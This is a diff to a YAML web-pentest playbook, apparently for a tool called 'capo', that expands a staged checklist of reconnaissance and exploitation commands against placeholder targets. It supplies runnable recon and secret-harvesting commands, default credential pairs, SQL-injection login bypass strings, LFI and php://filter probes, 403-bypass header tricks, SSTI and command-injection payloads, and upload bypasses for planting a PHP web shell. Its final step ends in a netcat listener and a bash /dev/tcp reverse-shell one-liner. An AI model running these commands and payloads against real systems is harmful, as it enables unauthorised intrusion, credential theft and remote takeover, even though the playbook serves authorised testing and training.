@@ -10,77 +10,101 @@ steps:
   - id: tech-fingerprint
     name: "Technology Fingerprinting"
     phase: recon
-    description: "Identify web stack, frameworks, and versions"
+    description: "Identify web stack, frameworks, CMS, and versions — do this FIRST before any fuzzing."
     commands:
-      - "whatweb http://{IP}"
-      - "curl -sI http://{IP}"
-      - "wappalyzer or browser dev tools"
+      - "curl -sI http://{IP}  # Response headers: Server, X-Powered-By, Set-Cookie"
+      - "curl -sv http://{IP}/ 2>&1 | grep -iE '(server|x-powered-by|x-aspnet|set-cookie|content-security)'"
+      - "whatweb http://{IP}  # Tech detection: CMS, framework, language, server"
+      - "# Wappalyzer browser extension for GUI-based fingerprinting"
+    check:
+      ports_min: 1
+
+  - id: source-robots
+    name: "Source Code & Robots/Sitemap"
+    phase: recon
+    description: "Read page source, robots.txt, and sitemap BEFORE fuzzing — free intel."
+    commands:
+      - "curl -s http://{IP}/ | grep -iE '(comment|path|version|admin|TODO|password|secret|api.?key|token|config|internal|debug)'"
+      - "curl -s http://{IP}/robots.txt  # Disallowed paths = attack surface"
+      - "curl -s http://{IP}/sitemap.xml | grep '<loc>' | sed 's|<loc>||;s|</loc>||'  # All indexed URLs"
+      - "curl -s http://{IP}/ | grep -oP '(?<=<!--).*?(?=-->)'  # HTML comments — often leak paths or creds"
+      - "curl -s http://{IP}/ | grep -oE 'type=\"hidden\" name=\"[^\"]+\" value=\"[^\"]+\"'  # Hidden form fields"
 
   - id: subdomain-enum
     name: "Subdomain Enumeration"
     phase: recon
-    description: "Enumerate subdomains using active (brute-force) and passive (OSINT) methods"
+    description: "Enumerate subdomains using active (brute-force) and passive (OSINT) methods."
     commands:
-      - "subfinder -d {DOMAIN} -o subdomains_passive.txt # Passive: Collect from 30+ sources"
-      - "assetfinder --subs-only {DOMAIN} >> subdomains_passive.txt # Passive: Crawling/Certs"
-      - "amass enum -passive -d {DOMAIN} -o amass.txt # Passive: OSINT"
+      - "subfinder -d {DOMAIN} -o subdomains_passive.txt  # Passive: collect from 30+ sources"
+      - "assetfinder --subs-only {DOMAIN} >> subdomains_passive.txt  # Passive: crawling/certs"
+      - "amass enum -passive -d {DOMAIN} -o amass.txt  # Passive: OSINT"
       - "cat subdomains_passive.txt amass.txt | sort -u > subdomains.txt"
-      - "gobuster dns -d {DOMAIN} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o subdomains_active.txt # Active: DNS Brute"
-      - "ffuf -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.{DOMAIN} -mc 200,301,302,403 # Active: VHost Discovery"
+      - "gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o subdomains_active.txt  # Active: DNS brute"
+      - "ffuf -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.{DOMAIN} -mc 200,301,302,403  # Active: VHost"
       - "cat subdomains*.txt | sort -u > all_subdomains.txt"
-      - "httpx -l all_subdomains.txt -title -tech-detect -status-code # Validation: Check which actully respond"
+      - "httpx -l all_subdomains.txt -title -tech-detect -status-code  # Validate: which actually respond"
 
   - id: dir-fuzz
     name: "Directory & File Fuzzing"
     phase: recon
-    description: "Discover hidden paths and files"
+    description: "Discover hidden paths and files — ALWAYS include extensions based on detected stack."
     commands:
-      - "capo web fuzz"
-      - "capo web fuzz --ext php,asp,aspx,jsp,txt,bak"
-      - "feroxbuster -u http://{IP} -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2"
+      - "capo web fuzz  # Round 1: no extensions"
+      - "capo web fuzz --ext php,html,txt,bak,zip,conf,xml,json  # Round 2: common extensions (MANDATORY)"
+      - "# Stack-specific extensions:"
+      - "#   PHP  → php,phtml,php5,php7,php3,inc"
+      - "#   Java → jsp,jspx,do,action,class,war"
+      - "#   .NET → asp,aspx,ashx,asmx,config"
+      - "#   Python → py"
+      - "#   Ruby  → rb"
+      - "feroxbuster -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2  # Recursive fuzzing"
     check:
       directories_min: 1
+
+  - id: recursive-fuzz
+    name: "Recursive Fuzzing on Discovered Dirs"
+    phase: recon
+    description: "Every discovered directory is a new attack surface — fuzz INSIDE each one."
+    commands:
+      - "# For each discovered dir, fuzz recursively inside it:"
+      - "gobuster dir -u http://{IP}/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak -t 40"
+      - "gobuster dir -u http://{IP}/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,php -t 40"
+      - "# Tip: feroxbuster handles this automatically with --depth 2+"
 
   - id: vhost-enum
     name: "Virtual Host Enumeration"
     phase: recon
-    description: "Find additional hostnames and vhosts"
+    description: "Find additional hostnames and vhosts — often exposes completely different apps."
     commands:
       - "capo web vhost"
-      - "ffuf -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -w subdomains.txt -fc 302"
+      - "gobuster vhost -u http://{IP}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"
+      - "ffuf -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fs <baseline_size>"
 
   - id: source-analysis
     name: "Source Code & Endpoint Analysis"
     phase: enumeration
-    description: "Analyze page source, JS files, and headers for hidden endpoints, secrets, and leaks"
+    description: "Analyze page source, JS files, and headers for hidden endpoints, secrets, and leaks."
     commands:
-      - "curl -s http://{IP} | grep -iE '(password|secret|api.?key|token|auth|config|internal|admin|debug)' # Quick secrets grep in HTML"
-      - "curl -s http://{IP} | grep -oE 'src=\"[^\"]+\\.js[^\"]*\"' | sed 's/src=\"//;s/\"$//' # Extract JS file references"
-      - "curl -s http://{IP}/robots.txt  # Disallowed paths = attack surface"
-      - "curl -s http://{IP}/sitemap.xml | grep '<loc>' | sed 's|<loc>||;s|</loc>||' # All indexed URLs"
-      - "curl -sI http://{IP} | grep -iE '(server|x-powered-by|x-aspnet|set-cookie|access-control|content-security)' # Header analysis"
-      - "# --- JS Endpoint Discovery ---"
-      - "python3 LinkFinder.py -i http://{IP} -d -o /tmp/js_endpoints.txt # Crawl + extract JS endpoints (github: GerbenJavado/LinkFinder)"
-      - "cat /tmp/js_endpoints.txt | grep -vE '\\.(png|jpg|css|woff)' # Filter out assets"
-      - "# --- Secrets in JS ---"
-      - "python3 SecretFinder.py -i http://{IP} -e -o /tmp/secrets.html # Find API keys/tokens in all JS (github: m4ll0k/SecretFinder)"
-      - "trufflehog --only-verified filesystem ./js_files/ # Verify found secrets"
-      - "# --- API discovery ---"
-      - "curl -s http://{IP}/api/docs http://{IP}/swagger.json http://{IP}/openapi.json http://{IP}/api/v1 2>/dev/null | python3 -m json.tool # OpenAPI spec"
-      - "ffuf -u http://{IP}/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403"
-      - "# --- Wayback / historical URLs ---"
-      - "waybackurls {DOMAIN} | tee /tmp/wayback.txt | grep -E '\\?(.*=)' | sort -u # Historical URLs with params"
-      - "gau {DOMAIN} | grep -E '\\.(js|json|php|asp|aspx)' | sort -u # All known URLs for interesting file types"
-      - "# --- Hidden form fields & comments ---"
-      - "curl -s http://{IP} | grep -oP '(?<=<!--).*?(?=-->)' # HTML comments"
-      - "curl -s http://{IP} | grep -oE 'type=\"hidden\" name=\"[^\"]+\" value=\"[^\"]+\"' # Hidden form fields"
+      - "curl -s http://{IP}/ | grep -oE 'src=\"[^\"]+\\.js[^\"]*\"' | sed 's/src=\"//;s/\"$//'  # Extract JS references"
+      - "# JS endpoint discovery:"
+      - "python3 LinkFinder.py -i http://{IP} -d -o /tmp/js_endpoints.txt  # github: GerbenJavado/LinkFinder"
+      - "cat /tmp/js_endpoints.txt | grep -vE '\\.(png|jpg|css|woff)'  # Filter assets"
+      - "# Secrets in JS:"
+      - "python3 SecretFinder.py -i http://{IP} -e -o /tmp/secrets.html  # github: m4ll0k/SecretFinder"
+      - "trufflehog --only-verified filesystem ./js_files/  # Verify found secrets"
+      - "# API discovery:"
+      - "curl -s http://{IP}/api/docs http://{IP}/swagger.json http://{IP}/openapi.json http://{IP}/api/v1 2>/dev/null | python3 -m json.tool"
+      - "ffuf -u http://{IP}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403"
+      - "# Wayback / historical URLs:"
+      - "waybackurls {DOMAIN} | tee /tmp/wayback.txt | grep -E '\\?(.*=)' | sort -u  # URLs with params"
+      - "gau {DOMAIN} | grep -E '\\.(js|json|php|asp|aspx)' | sort -u  # Known URLs for interesting file types"
     check:
       directories_min: 1
 
   - id: git-exposure
     name: "Git Repository Exposure"
     phase: enumeration
-    description: "Dump and triage an exposed .git directory for source code and credentials"
+    description: "Dump and triage an exposed .git directory for source code and credentials."
     commands:
       - "curl -s http://{IP}/.git/HEAD  # Confirm exposure (expect: 'ref: refs/heads/...')"
       - "curl -s http://{IP}/.git/config  # Grab remote URL and branch info"
@@ -95,7 +119,7 @@ steps:
   - id: cms-scan
     name: "CMS / Framework Specific Scans"
     phase: enumeration
-    description: "Run targeted scans for detected CMS platforms"
+    description: "Run targeted scans for detected CMS platforms."
     commands:
       - "wpscan --url http://{IP} -e ap,at,u"
       - "droopescan scan drupal -u http://{IP}"
@@ -104,40 +128,87 @@ steps:
   - id: param-fuzz
     name: "Parameter & Input Fuzzing"
     phase: enumeration
-    description: "Discover hidden parameters and test input handling"
+    description: "Discover hidden parameters and test input handling on every endpoint."
     commands:
-      - "arjun -u http://{IP}/endpoint"
-      - "ffuf -u 'http://{IP}/page?FUZZ=test' -w params.txt -fc 302"
+      - "arjun -u http://{IP}/endpoint  # Discover hidden parameters"
+      - "ffuf -u 'http://{IP}/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs <baseline_size>"
+      - "# Test LFI on any ?file= ?page= ?path= parameter:"
+      - "curl 'http://{IP}/page.php?file=../../../../etc/passwd'"
+      - "# Manual SQLi probe:"
+      - "curl 'http://{IP}/page.php?id=1\\''  # Syntax error = likely SQLi"
+      - "curl 'http://{IP}/page.php?id=1 AND 1=1'  # True condition"
+      - "curl 'http://{IP}/page.php?id=1 AND 1=2'  # False condition — different response = SQLi confirmed"
+      - "curl 'http://{IP}/page.php?id=1 ORDER BY 5--'  # Enumerate columns"
 
   - id: auth-test
     name: "Authentication Testing"
     phase: credential-access
-    description: "Test for default creds, brute-force, registration flaws"
+    description: "Test for default creds, brute-force, registration flaws — try DEFAULTS FIRST."
     commands:
-      - "hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'"
-      - "Check for password reset, registration, and session flaws"
+      - "# --- Default credentials (ALWAYS TRY FIRST) ---"
+      - "# admin:admin | admin:password | admin:admin123"
+      - "# root:root | root:toor | guest:guest | test:test"
+      - "# --- SQL injection auth bypass ---"
+      - "# admin' or '1'='1  |  admin'--  |  ' or 1=1--"
+      - "# --- Brute-force (only if no lockout) ---"
+      - "hydra -l admin -P /usr/share/wordlists/rockyou.txt {IP} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
+      - "# --- Check for registration / password reset flaws ---"
+
+  - id: forbidden-bypass
+    name: "403/401 Bypass Techniques"
+    phase: enumeration
+    description: "Bypass forbidden and unauthorized responses using header and method tricks."
+    commands:
+      - "# --- 403 Forbidden bypass ---"
+      - "curl -H 'X-Original-URL: /admin' http://{IP}/"
+      - "curl -H 'X-Rewrite-URL: /admin' http://{IP}/"
+      - "curl http://{IP}/admin/ -H 'X-Forwarded-For: 127.0.0.1'"
+      - "curl http://{IP}/admin/ -H 'X-Custom-IP-Authorization: 127.0.0.1'"
+      - "curl http://{IP}/admin..;/"
+      - "curl http://{IP}//admin/"
+      - "curl http://{IP}/./admin/"
+      - "# --- 401 Unauthorized — try method switching ---"
+      - "curl -X POST http://{IP}/admin/"
+      - "curl -X PUT http://{IP}/admin/"
+      - "curl -X TRACE http://{IP}/admin/"
 
   - id: injection
     name: "Injection Testing"
     phase: exploitation
-    description: "Test for SQL injection, command injection, SSTI, etc."
+    description: "Test for SQL injection, command injection, SSTI — manual first, then automated."
     commands:
+      - "# --- Manual SQLi (BEFORE sqlmap) ---"
+      - "# Probe: add ' to parameter values, check for errors"
+      - "# Boolean: id=1 AND 1=1 vs id=1 AND 1=2"
+      - "# Union: id=1 UNION SELECT NULL,NULL,NULL--"
       - "sqlmap -u 'http://{IP}/page?id=1' --batch --dbs"
-      - "Test for SSTI: {{7*7}}, ${7*7}, #{7*7}"
-      - "Test for command injection: ; id, | id, $(id)"
+      - "# --- SSTI (Server-Side Template Injection) ---"
+      - "# Test payloads: {{7*7}} | ${7*7} | #{7*7} | <%= 7*7 %>"
+      - "# --- Command injection ---"
+      - "# Test payloads: ; id | | id | $(id) | \\`id\\`"
 
   - id: file-ops
     name: "File Upload / Include"
     phase: exploitation
-    description: "Test file upload and local/remote file inclusion"
+    description: "Test file upload bypasses and LFI/RFI — use multiple bypass techniques."
     commands:
-      - "Test LFI: http://{IP}/page?file=../../../../etc/passwd"
-      - "Upload web shell via file upload functionality"
+      - "# --- LFI (Local File Inclusion) ---"
+      - "curl 'http://{IP}/page?file=../../../../etc/passwd'"
+      - "curl 'http://{IP}/page?file=....//....//....//etc/passwd'  # Double encoding"
+      - "curl 'http://{IP}/page?file=php://filter/convert.base64-encode/resource=index.php'  # PHP wrapper"
+      - "# --- File upload bypasses ---"
+      - "# Extension bypass: shell.php.jpg | shell.phtml | shell.php5 | shell.pHp"
+      - "# Content-Type bypass: change to image/jpeg instead of application/php"
+      - "# Magic bytes: prepend GIF89a; to PHP shell"
+      - "# Double extension: shell.php%00.jpg (null byte — old PHP)"
+      - "# .htaccess upload: AddType application/x-httpd-php .txt"
 
   - id: shell
     name: "Get a Shell"
     phase: exploitation
-    description: "Obtain remote code execution"
+    description: "Obtain remote code execution via discovered vector."
     commands:
-      - "nc -lvnp 4444"
-      - "Trigger reverse shell via discovered vector"
+      - "nc -lvnp 4444  # Start listener"
+      - "# Trigger reverse shell via discovered vector (SQLi, LFI, upload, SSTI, etc.)"
+      - "# Quick shells: bash -i >& /dev/tcp/LHOST/4444 0>&1"
+      - "#              python3 -c 'import socket,subprocess,os;...'"
